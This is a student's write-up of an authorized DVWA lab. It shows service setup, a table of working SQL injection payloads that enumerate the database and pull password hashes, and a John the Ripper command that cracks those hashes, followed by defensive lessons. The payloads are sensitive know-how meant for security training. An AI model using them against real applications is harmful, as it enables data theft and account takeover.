# Exercise 1 — Database Attack Types and Exploits

**Author:** Isabelle Jean  
**Scope:** Authorized DVWA training environment  
**Evidence:** Supplied lab instructions and the attached XAMPP screenshot. Later outcomes below are described by the lab instructions, not independently verified execution results.

## Objective

Explore how unsafe handling of web input can expose database information, how captured password hashes can be tested offline, and how recovered lab credentials can be validated against the training application.

## Environment

| Device | Operating system | Role |
| --- | --- | --- |
| PLABDC01 | Windows Server 2019 | Domain controller |
| PLABDM01 | Windows Server 2019 | Domain member server hosting the lab application |
| PLABKALI | Kali Linux | Testing workstation |

**Application:** DVWA at `http://192.168.0.2:121/dvwa`  
**Tools:** XAMPP, Apache, MySQL/MariaDB, Edge, Firefox ESR, a text editor, and John the Ripper.

## Task 1 — Verify That DVWA Is Running

### Method

Open XAMPP on the application server and start Apache and MySQL. Open the DVWA URL in Edge and authenticate with the provided training account. Decline the browser's password-saving prompt.

### Observed Evidence

The attached XAMPP screenshot shows Apache and MySQL highlighted as running, with **Stop** buttons available. Apache lists ports **121 and 443**, and MySQL lists **3306**. The log panel also records both services changing to running.

**Figure 1 — Apache and MySQL Running in XAMPP**  
Source: `image(20261022-054955).png`  
Caption: XAMPP confirms that the web server and database services are running before the DVWA exercise.

The lab URL uses HTTP on **port 121**, matching the screenshot. The generic note about HTTP port 80 does not describe this particular configuration. A listener on port 443 alone does not establish that this DVWA session used HTTPS.

**Result:** Service startup is supported by the supplied screenshot. Successful browser login is described in the instructions; its result screenshot has not been attached.

## Task 2 — Conduct an SQL Injection Exploit

### Method

On Kali, open DVWA in Firefox, authenticate with the training account, and set **DVWA Security** to **Low**. Open the SQL Injection page and compare normal user lookups with inputs that change the query structure.

The payloads below reproduce the supplied training procedure with straight ASCII quotes. They apply only to the authorized DVWA target.

| Stage | Input | Purpose |
| --- | --- | --- |
| Baseline | `2` and `3` | Observe normal single-user lookups |
| Syntax probe | `3'` | Test how an unmatched quote affects the query |
| Boolean condition | `3' and 1=1 #` | Add a true condition and comment out the query suffix |
| Database version | `3' and 1=0 union select null, version() #` | Return the database version |
| Connection identity | `3' and 1=0 union select null, user() #` | Return the database connection identity |
| Current database | `3' and 1=0 union select null, database() #` | Return the selected database name |
| Table enumeration | `3' and 1=0 union select null, table_name from information_schema.tables #` | List table names visible to the database account |
| Filtered enumeration | `3' and 1=0 union select null, table_name from information_schema.tables where table_schema!='mysql' and table_schema!='information_schema' #` | Exclude two system schemas |
| Column enumeration | `3' and 1=0 union select null, column_name from information_schema.columns where table_name='users' #` | List columns for tables named users |
| Lab hash retrieval | `3' and 1=0 union select null, concat(first_name,0x0a,password) from users #` | Return first names and stored password hashes |

The false condition suppresses the original matching row, allowing the injected UNION output to be examined. The two selected expressions match the query shape used by this lab.

### Interpretation

Normal ID lookups alone do not establish SQL injection. The meaningful evidence is whether input changes SQL behavior or returns data outside the intended lookup. A MariaDB error may disclose the database product, but using MariaDB is not itself the vulnerability.

The functions have distinct roles: `version()` returns the version, `user()` returns the connection identity, and `database()` returns the current database. Table-name queries return tables, not column headings.

The filtered query excludes only the two named schemas. Also, filtering columns by `table_name='users'` alone can include matching tables from multiple schemas.

### Prepare the Captured Lab Data

The instructions copy the returned data into a text editor, remove page labels, and save one label-and-hash entry per line in `/home/plabadmin/Desktop/Passwords`.

Public documentation uses this structure only:

```text
<account_label>:<password_hash>
```

The supplied extraction query selects **first_name**, not the login username field. These labels should not automatically be treated as login usernames without checking the application account mapping.

**Result described by the lab:** Account-related data and password hashes are exposed and formatted for offline testing. No captured hashes are published here.

### Suggested Evidence Captions

- **Normal User Lookup Before Injection**
- **SQL Error Triggered by an Unmatched Quote**
- **Database Metadata Returned Through UNION Injection**
- **Application Tables and Columns Enumerated**
- **Captured Lab Hashes Prepared for Offline Testing** — redact hash values before public upload.

## Task 3 — Crack Captured Password Hashes Using John the Ripper

### Method

The lab tests the prepared hashes with John the Ripper and the provided wordlist:

```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt /home/plabadmin/Desktop/Passwords
```

This corrects the mixed dash characters in the supplied command. The lab specifies raw MD5; the command relies on that format and the wordlist being available at the stated location.

John tests candidate passwords against the stored hashes. This is password guessing against hashes, not decryption.

### Validation

The supplied instructions describe recovering lab passwords, logging out of DVWA, and successfully authenticating as Pablo with a recovered credential. Password values and the local hash file are omitted from this public repository.

**Result status:** Password recovery and the successful login are described by the instructions. Their output screenshots have not been attached, so no recovery count or independent verification is claimed.

### Suggested Evidence Captions

- **John the Ripper Processing the Lab Hash File**
- **Recovered Lab Credentials Validated in DVWA** — redact the credential values.
- **Authenticated DVWA Session After Validation**

## Security Lessons

The exercise connects unsafe SQL query construction with disclosure of account data and subsequent offline password testing. Stronger passwords can make guessing harder, but they do not fix SQL injection.

The relevant defensive lessons are separating SQL code from user input through parameterized queries, limiting database-account permissions, avoiding detailed database errors in user-facing responses, and using salted password-hashing schemes designed for password storage.

## Summary

| Task | Documented outcome | Evidence coverage |
| --- | --- | --- |
| DVWA verification | Apache and MySQL running | Attached XAMPP screenshot |
| SQL injection | Metadata enumeration and lab hash retrieval | Supplied instructions |
| Offline testing | Password recovery and DVWA login validation | Supplied instructions |

The task write-up is complete for the supplied material. Additional result screenshots can strengthen the portfolio evidence. Figure 1 is currently identified by filename and caption; image assets are not embedded.

[Return to project overview](../README.md)
